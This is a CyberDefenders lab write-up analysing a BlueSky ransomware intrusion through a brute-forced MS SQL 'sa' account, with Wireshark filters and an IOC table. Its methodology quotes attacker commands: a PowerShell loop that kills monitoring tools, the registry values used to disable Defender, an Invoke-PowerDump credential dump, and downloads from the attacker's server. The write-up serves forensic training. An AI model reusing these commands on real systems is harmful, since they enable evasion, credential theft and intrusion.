---
title: BlueSky Ransomware
platform: CyberDefenders
category: Network Forensics
difficulty: Medium
skills: Wireshark packet analysis, TDS/MS SQL protocol analysis, Windows Event Log analysis, PowerShell script analysis, malware behavioral analysis, MITRE ATT&CK mapping
---

# BlueSky Ransomware — CyberDefenders

## Scenario
A corporation reported a suspected ransomware attack after key files were encrypted and services were disrupted. I was given a PCAP and Windows event logs and asked to reconstruct the attacker's methods, identify the extent of the breach, and support containment.

## Objective
Trace the full attack chain — from initial compromise through a brute-forced MS SQL account to the deployment of ransomware — and identify the attacker's infrastructure, credentials used, tooling, persistence mechanism, and final payload.

## Methodology

**1. Identifying the scanning source**
Filtered for SYN packets without a corresponding ACK to isolate port scan behavior:

```
tcp.flags.syn==1 and tcp.flags.ack==0
```

This surfaced the attacker's source IP: `87.96.21.84`

**2. Identifying the targeted service and account**
Wireshark's Protocol Hierarchy Statistics showed traffic over **TDS (Tabular Data Stream)**, the wire protocol for MS SQL. Filtering on TDS login requests:

```
ip.src == 87.96.21.84 && ip.dst == 87.96.21.81 && tds.type == 16
```

revealed the target's desktop name (`DESKTOP-7EQVM78`), which was cross-referenced against Windows Event Logs to confirm the targeted account: `sa`

**3. Recovering the compromised credentials**
```
ip.addr == 87.96.21.84 && tds.7login.username == sa
```

The TDS login packet exposed the plaintext password: `cyb3rd3f3nd3r$`

> The `sa` (system administrator) account is a well-known, high-value target for MS SQL brute-force attacks — its compromise gives immediate administrative control over the database engine.

**4. Enabling command execution**
Following the SQL batch TCP stream showed the attacker enabling `xp_cmdshell`, the stored procedure that allows arbitrary OS command execution from within MS SQL — turning database access into full host command execution.

**5. Privilege escalation via process injection**
Filtering Windows Event Logs for **Event ID 400** (PowerShell engine start) and inspecting the `HostApplication` field for anomalies revealed the attacker's C2 was injected into `winlogon.exe`, a legitimate system process, to gain administrative-level privileges and blend in with normal system activity.

**6. Initial payload delivery**
```
ip.addr == 87.96.21.84 && http.request.method == "GET"
```

First GET request retrieved: `http://87.96.21.84/checking.ps1`

**7. Environment/privilege checks**
Filtering for the downloaded script and following the HTTP stream:
```
ip.addr == 87.96.21.84 && frame contains "checking.ps1"
```

The script checked for membership in the local Administrators group SID: `S-1-5-32-544`

**8. Defense evasion — disabling Windows Defender**
Within the same HTTP stream, the script modified the following registry values, in order:

```
DisableAntiSpyware
DisableRoutinelyTakingAction
DisableRealtimeMonitoring
SubmitSamplesConsent
SpynetReporting
```

**9. Second-stage payload**
```
ip.addr == 87.96.21.84 && http.request.method == "GET"
```

Second GET request retrieved: `http://87.96.21.84/del.ps1`

Following that stream revealed a defense-evasion routine that kills common monitoring/forensic tools before continuing execution:

```powershell
list = "taskmgr", "perfmon", "SystemExplorer", "taskman", "ProcessHacker", "procexp64", "procexp", "Procmon", "Daphne"
foreach($task in $list)
{
    try {
        stop-process -name $task -Force
    }
    catch {}
}

stop-process $pid -Force
```

This maps to MITRE tactic **TA0005 – Defense Evasion**.

**10. Establishing persistence**
Continuing through the `checking.ps1` HTTP stream and searching for the keyword `task` revealed a scheduled task created for persistence:

```
\Microsoft\Windows\MUI\LPupdate
```

**11. Credential dumping**
Following the HTTP stream for `ichigo-lite.ps1` revealed two Base64-encoded lines. Decoding them showed:
- Line 1: downloads `Invoke-PowerDump.ps1`
- Line 2: executes the dump and saves output —

```powershell
Invoke-PowerDump | Out-File -FilePath "C:\ProgramData\hashes.txt"
```

Dumped credentials were saved to `hashes.txt`.

**12. Network discovery**
The same stream showed the attacker pulling a list of previously discovered hosts for lateral movement:

```powershell
$hostsContent = Invoke-WebRequest -Uri "http://87.96.21.84/extracted_hosts.txt" | Select-Object -ExpandProperty Content -ErrorAction Stop
```

Discovered hosts were stored in `extracted_hosts.txt`.

**13. Ransomware behavioral analysis**
The attacker's final executable was extracted from an HTTP GET response in the PCAP (`javaw.exe`). Hashing the extracted binary:

```powershell
Get-FileHash -Algorithm SHA256 .\javaw.exe
```

and submitting the hash to VirusTotal's **Behavior → File Dropped** tab confirmed the ransom note dropped on execution: `# DECRYPT FILES BLUESKY #`

> This matches publicly documented BlueSky behavior: the family drops matching `.txt` and `.html` ransom notes with this exact name and appends the `.bluesky` extension to encrypted files — corroborating the sandbox result against known threat intelligence.

**14. Ransomware family identification**
Submitting the sample/IOCs to ANY.RUN confirmed the family: **BlueSky Ransomware**, a Conti-derived strain (sharing traits with Babuk/TargetCompany) first observed in mid-2022, known for multi-threaded ChaCha20/RSA-4096 encryption.

## Key Findings / IOCs

| Type | Value |
|---|---|
| Attacker IP | `87.96.21.84` |
| Compromised account | `sa` |
| Compromised password | `cyb3rd3f3nd3r$` |
| C2-injected process | `winlogon.exe` |
| Stage 1 payload | `http://87.96.21.84/checking.ps1` |
| Stage 2 payload | `http://87.96.21.84/del.ps1` |
| Credential dumper | `Invoke-PowerDump.ps1` (via `ichigo-lite.ps1`) |
| Dumped hashes file | `C:\ProgramData\hashes.txt` |
| Discovered hosts file | `extracted_hosts.txt` |
| Persistence | Scheduled task `\Microsoft\Windows\MUI\LPupdate` |
| Ransomware binary | `javaw.exe` |
| Ransom note | `# DECRYPT FILES BLUESKY #` (.txt/.html) |
| Encrypted file extension | `.bluesky` |
| Ransomware family | BlueSky |

## Lessons Learned
- Internet-facing MS SQL instances with the `sa` account enabled are a recurring initial-access vector; `xp_cmdshell` being reachable turns a DB compromise into full host compromise almost immediately.
- Defense evasion in this chain relied heavily on process injection into trusted binaries (`winlogon.exe`) — Event ID 400 with an anomalous `HostApplication` field is a high-value detection point I hadn't used before this lab.
- Registry-based Defender tampering (`DisableRealtimeMonitoring`, etc.) is fast to check for and should be a standing SIEM/EDR alert rather than something found only in hindsight.
- When a lab doesn't give a direct answer in the traffic/log data alone (the ransom note name), pulling the dropped binary and checking sandbox behavioral data (VirusTotal/ANY.RUN) is a legitimate and necessary technique — not a shortcut.
